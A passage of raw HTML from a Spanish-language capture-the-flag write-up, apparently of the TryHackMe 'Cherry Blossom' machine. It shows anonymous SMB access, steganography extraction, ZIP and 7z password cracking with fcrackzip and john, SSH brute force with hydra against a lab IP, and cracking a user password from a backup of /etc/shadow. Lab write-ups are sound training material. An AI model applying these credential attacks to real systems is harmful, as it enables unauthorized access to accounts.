&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~# smbclient &lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;10.10.214.121&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;Anonymous
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oot&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password: 
Anonymous login successful
Try &lt;span class=&#34;s2&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt; to get a list of possible commands.
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; ls
  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Feb  &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; 18:22:51 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Feb  &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; 11:48:18 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  journal.txt                         N  &lt;span class=&#34;m&#34;&gt;3470998&lt;/span&gt;  Sun Feb  &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; 18:20:53 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
in
		&lt;span class=&#34;m&#34;&gt;10253588&lt;/span&gt; blocks of size 1024. &lt;span class=&#34;m&#34;&gt;5083492&lt;/span&gt; blocks available
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; get journal.txt
getting file &lt;span class=&#34;se&#34;&gt;\j&lt;/span&gt;ournal.txt of size &lt;span class=&#34;m&#34;&gt;3470998&lt;/span&gt; as journal.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;334.1 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 334.1 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El archivo &lt;code&gt;journal.txt&lt;/code&gt; contiene una cadena base64 decodificamos el archivo y vemos que el header del archivo pertenece a una imagen PNG:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/cherryblossom# xxd file&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;head
00000000: &lt;span class=&#34;m&#34;&gt;8950&lt;/span&gt; 4e47 0d0a 1a0a &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; 000d &lt;span class=&#34;m&#34;&gt;4948&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;4452&lt;/span&gt;  .PNG........IHDR
00000010: &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0500&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0355&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0802&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0000&lt;/span&gt; 00a8 15c4  .......U........
00000020: de00 &lt;span class=&#34;m&#34;&gt;0100&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0049&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;4441&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;5478&lt;/span&gt; da24 fd57 b0ee  .....IDATx.$.W..
00000030: 5b76 dd87 adbc fef1 cbfb db39 9d1c 6ece  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;v.........9..n.
00000040: dd7d 3ba2 9be8 6e34 &lt;span class=&#34;m&#34;&gt;0812&lt;/span&gt; 4c82 400b &lt;span class=&#34;m&#34;&gt;2265&lt;/span&gt;  .&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;...n4..L.@.&lt;span class=&#34;s2&#34;&gt;&amp;#34;e
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;00000050: 9669 5145 3d58 65ca 2597 5d96 4359 2e27  .iQE=Xe.%.].CY.&amp;#39;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;00000060: 49a4 5c76 5952 1545 1206 099a 8009 a0d1  I.\vYR.E........
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;00000070: 4027 74ee 7bfb e670 ce3d 619f 9df7 fef2  @&amp;#39;t.{..p.=a.....
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;00000080: f7cf 2b2f 3ff4 e378 99cf a3c6 fccd 39e0  ..+/?..x......9.
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;00000090: eeb5 bb0e 3804 8183 0079 e8a0 471e 5964  ....8....y..G.Yd
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Cambiamos el archivo a .PNG y la imagen parece no tener nada:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cherryblossom/Screenshot_20200221_223307.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Despues de intentar con una gran cantidad de herramientas de esteganografia finalmente con &lt;code&gt;stegpy&lt;/code&gt; logramos extraer un archivo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@872e41903b6a:/data# stegpy file.png 
File _journal.zip succesfully extracted from file.png
root@872e41903b6a:/data# file _journal.zip 
_journal.zip: JPEG image data
root@872e41903b6a:/data#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos que el archivo esta con extension zip pero los headers de este son en JPGE, editamos el archivo con los &amp;ldquo;magic numbers&amp;rdquo; de un archivo ZIP.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;➜  ctf unzip journal_dat.zip
Archive:  journal_dat.zip
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;journal_dat.zip&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Journal.ctz password: 
   skipping: Journal.ctz             incorrect password
➜  ctf
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El archivo esta protegido con contraseña utilizamos &lt;code&gt;fcrackzip&lt;/code&gt; para encontrar la contraseña del archivo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;➜  ctf fcrackzip -D -u -p /home/sckull/tools/rockyou.txt journal_dat.zip 
PASSWORD FOUND!!!!: &lt;span class=&#34;nv&#34;&gt;pw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; s&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;r
➜  ctf 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Extraemos un archivo ctz, utilizamos 7zjohn para obtener el hash para poder crackearlo con john:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;➜  ctf perl 7zjohn.pl Journal.ctz &amp;gt; hash.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos john y rockyou para obtener la contraseña:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/cherryblossom# john hash.txt --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; password &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;7z, 7-Zip &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SHA256 256/256 AVX2 8x AES&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
Cost &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;iteration count&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; is &lt;span class=&#34;m&#34;&gt;524288&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; all loaded hashes
Cost &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;padding size&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; is &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; all loaded hashes
Cost &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;compression &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; is &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; all loaded hashes
Will run &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; OpenMP threads
Press &lt;span class=&#34;s1&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; status
0g 0:00:01:45 0.02% &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ETA: 2020-02-29 18:28&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 0g/s 26.33p/s 26.33c/s 26.33C/s puppy1..victoria1
t&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;y        &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Journal.ctz&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
1g 0:00:03:40 DONE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2020-02-21 23:29&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 0.004525g/s 25.34p/s 25.34c/s 25.34C/s brownsugar..inferno
Use the &lt;span class=&#34;s2&#34;&gt;&amp;#34;--show&amp;#34;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed
root@aoiri:~/tryhackme/cherryblossom#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Extraemos el archivo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;➜  tmp 7z e Journal.ctz   

7-Zip &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;64&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 16.02 : Copyright &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;locale&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;en_US.UTF-8,Utf16&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;on,HugeFiles&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;on,64 bits,8 CPUs Intel&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;R&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Core&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;TM&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; i5-8250U CPU @ 1.60GHz &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;806EA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,ASM,AES-NI&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

Scanning the drive &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; archives:
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; file, &lt;span class=&#34;m&#34;&gt;70434&lt;/span&gt; bytes &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;69&lt;/span&gt; KiB&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

Extracting archive: Journal.ctz
--
&lt;span class=&#34;nv&#34;&gt;Path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; Journal.ctz
&lt;span class=&#34;nv&#34;&gt;Type&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 7z
Physical &lt;span class=&#34;nv&#34;&gt;Size&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;70434&lt;/span&gt;
Headers &lt;span class=&#34;nv&#34;&gt;Size&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;146&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;Method&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; LZMA2:16 7zAES
&lt;span class=&#34;nv&#34;&gt;Solid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; -
&lt;span class=&#34;nv&#34;&gt;Blocks&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
   
Enter password &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;will not be echoed&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
Everything is Ok  

Size:       &lt;span class=&#34;m&#34;&gt;158136&lt;/span&gt;
Compressed: &lt;span class=&#34;m&#34;&gt;70434&lt;/span&gt;
➜  tmp ls
Journal.ctd  Journal.ctz
➜  tmp
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos un archivo CTD, en su interior vemos un &amp;ldquo;diario&amp;rdquo; que pertenece a Johan, en donde explica que esta escribiendo un wordlist super seguro. Utilizamos el wordlist cherry-blossom.list con el usuario Lily junto con hydra y obtenemos la contraseña en el servicio SSH:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/cherryblossom# hydra -l lily -P wordlists/cherry-blossom.list ssh://10.10.76.210
Hydra v9.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; by van Hauser/THC - Please &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; not use in military or secret service organizations, or &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; illegal purposes.

Hydra &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;https://github.com/vanhauser-thc/thc-hydra&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; starting at 2020-02-21 23:44:12
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;WARNING&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DATA&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; max &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; tasks per &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; server, overall &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; tasks, &lt;span class=&#34;m&#34;&gt;9923&lt;/span&gt; login tries &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;l:1/p:9923&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, ~621 tries per task
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DATA&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; attacking ssh://10.10.76.210:22/
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;STATUS&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 102.00 tries/min, &lt;span class=&#34;m&#34;&gt;102&lt;/span&gt; tries in 00:01h, &lt;span class=&#34;m&#34;&gt;9821&lt;/span&gt; to &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; in 01:37h, &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; active
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;STATUS&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 112.00 tries/min, &lt;span class=&#34;m&#34;&gt;336&lt;/span&gt; tries in 00:03h, &lt;span class=&#34;m&#34;&gt;9587&lt;/span&gt; to &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; in 01:26h, &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; active
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;22&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;ssh&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; host: 10.10.76.210   login: lily   password: M&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; of &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; target successfully completed, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; valid password found
Hydra &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;https://github.com/vanhauser-thc/thc-hydra&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; finished at 2020-02-21 23:51:03
root@aoiri:~/tryhackme/cherryblossom#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cherryblossom/Screenshot_20200221_235546.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener una shell con el usuario &lt;strong&gt;lily&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cherryblossom/Screenshot_20200221_235648.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---johan&#34;&gt;USER - Johan&lt;/h2&gt;
&lt;p&gt;Los archivos de backup siempre tienen cosas interesantes, en esta maquina encontramos un backup de las contraseñas de &lt;strong&gt;/etc/shadow&lt;/strong&gt;, utilizamos john para crackear las contraseña de johan.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cherryblossom/Screenshot_20200222_000904.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos el wordlist que encontramos antes:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cherryblossom/Screenshot_20200222_002837.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
